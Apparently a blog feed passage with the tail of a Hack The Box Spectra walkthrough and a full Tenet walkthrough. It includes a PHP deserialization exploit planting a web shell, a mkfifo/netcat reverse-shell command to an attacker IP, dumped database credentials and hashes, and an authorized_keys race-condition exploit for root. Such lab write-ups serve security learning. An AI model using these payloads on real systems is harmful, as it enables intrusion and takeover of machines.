<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># At Spectra as Kali</span>
katie@spectra /etc/init <span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl stop test10
initctl: Unknown instance:
katie@spectra /etc/init <span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl start test10
test10 start/running, process 4947
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># At attacker machine</span>
<span class="nv">$ </span>nc <span class="nt">-lnvp</span> 4443
listening on <span class="o">[</span>any] 4443 ...
connect to <span class="o">[</span>10.10.10.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.229] 33606
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># whoami</span>
root
<span class="c"># cat /root/root.txt</span>
&lt;redacted&gt;
</code></pre></div></div>

<p>I hope you guys have enjoyed it!</p>

<p>See you in the next post :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Easy" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Spectra, another easy-rated box from Hack The Box, created by egre55.]]></summary></entry><entry><title type="html">Walktrough: HTB Tenet</title><link href="https://davicruz.com/walkthrough/2021/06/htb-tenet" rel="alternate" type="text/html" title="Walktrough: HTB Tenet" /><published>2021-06-12T13:00:00-03:00</published><updated>2021-06-12T13:00:00-03:00</updated><id>https://davicruz.com/walkthrough/2021/06/htb-tenet</id><content type="html" xml:base="https://davicruz.com/walkthrough/2021/06/htb-tenet"><![CDATA[<p>Hello guys!</p>

<p>This week’s machine will be <strong>Tenet</strong>, another medium-rated Linux box from <a href="https://www.hackthebox.eu/">Hack The Box</a>, created by <a href="https://app.hackthebox.eu/users/94858">egotisticalSW</a>.<!--more--></p>

<p class="notice--info">:information_source: <strong>Info</strong>: Write-ups for Hack The Box machines are posted as soon as they’re retired.</p>

<p><img src="https://i.imgur.com/vouXrOD.png" alt="HTB Tenet" class="align-center" /></p>

<p>Before starting the resolution of this box, the image above called my attention, where I searched about TENET on the Internet and found about the Sator Square, where we have a palindrome made up of the 5 Latin words: <em>SATOR</em>, <em>AREPO</em>, <em>TENET</em>, <em>OPERA</em> e <em>ROTAS</em>, forming a square being TENET in the center lines. Is highly probable that these words will appear during its resolution :smile:.</p>

<h2 id="enumeration">Enumeration</h2>

<p>As usual, started with a quick <code class="language-plaintext highlighter-rouge">nmap</code> scan to identify the published services:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.223
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-27 14:36 <span class="nt">-03</span>
Nmap scan report <span class="k">for </span>10.10.10.223
Host is up <span class="o">(</span>0.079s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>18.06 seconds
</code></pre></div></div>

<h3 id="80tcp---http-service">80/TCP - HTTP Service</h3>

<p>Accessing this page noticed that was from the default Apache install so started right away to enumerate the directories using <code class="language-plaintext highlighter-rouge">gobuster</code> where I’ve found the WordPress directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.10.223/ <span class="nt">-o</span> gobuster.txt <span class="nt">-x</span> php,txt,html
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://10.10.10.223/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt,html
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2021/02/27 14:44:51 Starting gobuster
<span class="o">===============================================================</span>
/index.html <span class="o">(</span>Status: 200<span class="o">)</span>
/users.txt <span class="o">(</span>Status: 200<span class="o">)</span>
/wordpress <span class="o">(</span>Status: 301<span class="o">)</span>
Progress: 5055 / 220561 <span class="o">(</span>2.29%<span class="o">)</span>^C
<span class="o">[!]</span> Keyboard interrupt detected, terminating.
<span class="o">===============================================================</span>
2021/02/27 14:48:08 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<p>Once accessed it the page was loaded without formatting and, inspecting the source code, all the assets were pointing to <strong>tenet.htb</strong>, which was later added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p>

<p>Accessing the page again, checking that it was properly rendered now, and then using <code class="language-plaintext highlighter-rouge">wpscan</code> to enumerate version, users, and plugins, where I’ve identified this WordPress version as 5.6, no plugins and the users <strong>protagonist</strong> and <strong>neil</strong>.</p>

<p>As accessing the webpage again from the URL <code class="language-plaintext highlighter-rouge">http://10.10.10.223/wordpress</code> errors are shown, as the image below, accessed the address seen in source code (<code class="language-plaintext highlighter-rouge">http://tenet.htb</code>) full blog is displayed.</p>

<p><img src="https://i.imgur.com/7fwmYW7.png" alt="HTB Tenet - 80/TCP" class="align-center" /></p>

<p>In the WordPress instance available at <code class="language-plaintext highlighter-rouge">http://tenet.htb/wordpress</code>, noticed some posts where one of them was mentioning an application called <strong>Rotas</strong>, which could contain some item we could abuse to get an initial foothold in this box.</p>

<blockquote>
  <p>This Is Where Our Worlds Collide
We’re looking for beta testers of our new time-management software, ‘Rotas’
‘Rotas’ will hopefully be coming to market late 2021, pending rigorous QA from our developers, and you! For more information regarding opting-in, watch this space.</p>
</blockquote>

<p>Things get more interesting in an older post, where user <strong>neil</strong> comments the content below:</p>

<blockquote>
  <p>did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!</p>
</blockquote>

<p>Trying to access the file <code class="language-plaintext highlighter-rouge">sator.php</code> from the directory published under the DNS name hasn’t returned anything, but I’ve succeeded using the machine IP address, getting the output below:</p>

<p><img src="https://i.imgur.com/46AX0aF.png" alt="HTB Tenet - sator.php" class="align-center" /></p>

<p>As we have a backup of this file somewhere and backups are often renamed as <code class="language-plaintext highlighter-rouge">old</code> or <code class="language-plaintext highlighter-rouge">bak</code>, after a few attempts I have found the file <code class="language-plaintext highlighter-rouge">sator.php.bak</code> in the same directory as the previous, with the following content:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
        <span class="c1">//    echo 'Gotta get this working properly...';</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>

<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="nf">update_db</span><span class="p">();</span>

<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>As we can see we could exploit it using <strong>PHP Deserialization</strong>, once it doesn’t validate the inputs received using the GET method from the query string arg <strong>arepo</strong>, allowing us to modify the payload to be stored in the database file.</p>

<h2 id="initial-access">Initial access</h2>

<p>The first step to the reverse shell was to create a serialized PHP payload to be sent in a request via <strong>arepo</strong> arg. Searching a little about it I have found <a href="https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php">this exploit sample</a> which was later modified to store a simple web shell in the box, later used to get a reverse shell.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 

<span class="kd">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'shell.php'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">'&lt;?php system($_GET["cmd"]); ?&gt;'</span><span class="p">;</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">update_db</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="n">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="k">public</span> <span class="k">function</span> <span class="n">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/'</span> <span class="mf">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="n">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">);</span>
        <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
        <span class="c1">//    echo 'Gotta get this working properly...';</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://10.10.10.223/sator.php?arepo='</span><span class="p">;</span>
<span class="nv">$arepo</span> <span class="o">=</span> <span class="nv">$url</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">DatabaseExport</span><span class="p">));</span>
<span class="nv">$response</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"</span><span class="nv">$arepo</span><span class="s2">"</span><span class="p">);</span>
<span class="k">print</span> <span class="s2">"</span><span class="nv">$response</span><span class="s2">"</span><span class="p">;</span>
</code></pre></div></div>

<p>After its execution, I was able to issue the <code class="language-plaintext highlighter-rouge">id</code> command by using curl as we can see below.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php exploit.php
<span class="o">[]</span> Database updated &lt;br&gt;[+] Grabbing <span class="nb">users </span>from text file &lt;br&gt;
<span class="o">[]</span> Database updated &lt;br&gt;[] Database updated &lt;br&gt;   

<span class="nv">$ </span>curl <span class="nt">-L</span> http://10.10.10.223/shell.php?cmd<span class="o">=</span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>As we had a confirmed RCE, make the call to obtain a reverse shell as the following example:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-G</span> <span class="nt">--data-urlencode</span> <span class="s2">"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f"</span> http://10.10.10.223/shell.php
</code></pre></div></div>

<h2 id="user-flag">User Flag</h2>

<p>Accessing the box, once we already knew that at least one WordPress instance was present, searched for the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file where I got the credentials for user <strong>neil</strong></p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="cd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'neil'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'Opera2112'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>
</code></pre></div></div>

<p>As credential reuse is common, running <code class="language-plaintext highlighter-rouge">su neil</code> and providing the recently found password, we have succeeded in accessing the machine as this user and getting the user flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
neil@tenet:~<span class="nv">$ </span><span class="nb">cat</span> ~/user.txt
&lt;redacted&gt;
neil@tenet:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="root-flag">Root Flag</h2>

<p>In the path for root flag, decided to dump the database credentials in this machine, returning the following hashes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select user_login,user_pass from wp_users;
+-------------+------------------------------------+
| user_login  | user_pass                          |
+-------------+------------------------------------+
| protagonist | $P$BqNNfN07OWdaEfHmGwufBs.b.BebvZ. |
| neil        | $P$BtFC5SOvjEMFWLE4zq5DWXy7sJPUqM. |
+-------------+------------------------------------+
2 rows in set (0.00 sec)
</code></pre></div></div>

<p>Before trying to crack those hashes, being <code class="language-plaintext highlighter-rouge">protagonist</code> password reused from <code class="language-plaintext highlighter-rouge">root</code>, decided to check which permissions did <code class="language-plaintext highlighter-rouge">neil</code> had by running <code class="language-plaintext highlighter-rouge">sudo -l</code>, which resulted in the output below.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Matching Defaults entries for www-data on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:
    
User www-data may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
</code></pre></div></div>

<p>Inspecting the content of this file, we can see that it can be used to activate SSH login for <code class="language-plaintext highlighter-rouge">root</code> enforcing an existing SSH public key.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

checkAdded<span class="o">()</span> <span class="o">{</span>
    <span class="nv">sshName</span><span class="o">=</span><span class="si">$(</span>/bin/echo <span class="nv">$key</span> | /usr/bin/cut <span class="nt">-d</span> <span class="s2">" "</span> <span class="nt">-f</span> 3<span class="si">)</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-z</span> <span class="si">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="si">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /bin/echo <span class="s2">"Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
    <span class="k">else</span>
        /bin/echo <span class="s2">"Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!"</span>
    <span class="k">fi</span>
<span class="o">}</span>

checkFile<span class="o">()</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-s</span> <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
        /bin/echo <span class="s2">"Error in creating key file!"</span>
        <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi
        </span><span class="nb">exit </span>1
    <span class="k">fi</span>
<span class="o">}</span>

addKey<span class="o">()</span> <span class="o">{</span>
    <span class="nv">tmpName</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span> /tmp/ssh-XXXXXXXX<span class="si">)</span>
    <span class="o">(</span><span class="nb">umask </span>110<span class="p">;</span> <span class="nb">touch</span> <span class="nv">$tmpName</span><span class="o">)</span>
    /bin/echo <span class="nv">$key</span> <span class="o">&gt;&gt;</span><span class="nv">$tmpName</span>
    checkFile <span class="nv">$tmpName</span>
    /bin/cat <span class="nv">$tmpName</span> <span class="o">&gt;&gt;</span>/root/.ssh/authorized_keys
    /bin/rm <span class="nv">$tmpName</span>
<span class="o">}</span>

<span class="nv">key</span><span class="o">=</span><span class="s2">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span>
addKey
checkAdded
</code></pre></div></div>

<p>As we don’t have the private key, we could hijack its execution because the function <code class="language-plaintext highlighter-rouge">addKey</code> creates a temporary file containing the public key to be added to <code class="language-plaintext highlighter-rouge">root</code>’s authorized keys, having a race condition. If we could manage to overwrite this file during the script execution, we could inject our public key instead of the one present in the script.</p>

<p>The challenge here is to predict the name of the file created, once it uses the <code class="language-plaintext highlighter-rouge">mktemp</code> command, but as we have an idea of its format (<code class="language-plaintext highlighter-rouge">/tmp/ssh-XXXXX</code>) we could find a way to paste the contents from our public key to all files matching the same pattern. After some tests and research, the command <code class="language-plaintext highlighter-rouge">tee</code> was the solution, allowing us to output a content to multiple files at the same time. The simple script below was created to do this task.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
<span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do
        </span><span class="nb">echo</span> <span class="s2">"ssh-rsa AAAA..............BBBB= root@ubuntu"</span> | <span class="nb">tee</span> /tmp/ssh-<span class="k">*</span> 2&gt; /dev/null<span class="p">;</span>
<span class="k">done</span>
</code></pre></div></div>

<p>With the above script in execution, simply executed the bash script with <code class="language-plaintext highlighter-rouge">sudo</code> and then connected to the box with the previously created ssh private key, granting me root access and allowing me to get the root flag :smiley:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>neil@tenet:/tmp<span class="nv">$ </span><span class="nb">sudo</span>  /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:/tmp<span class="nv">$ </span>ssh <span class="nt">-i</span> tenet root@tenet.htb
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
<span class="o">[</span>...]
root@tenet:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@tenet:~# <span class="nb">cat</span> /root/root.txt
b05e57e997cda49b47757cd3f0f9ac43
</code></pre></div></div>

<p>I hope you guys have enjoyed this box resolution!</p>

<p>See you in the next post! :smiley:</p>]]></content><author><name>Davi Cruz</name></author><category term="Walkthrough" /><category term="HackTheBox" /><category term="HTB Medium" /><category term="HTB Linux" /><summary type="html"><![CDATA[Hello guys! This week’s machine will be Tenet, another medium-rated Linux box from Hack The Box, created by egotisticalSW.]]></summary></entry></feed>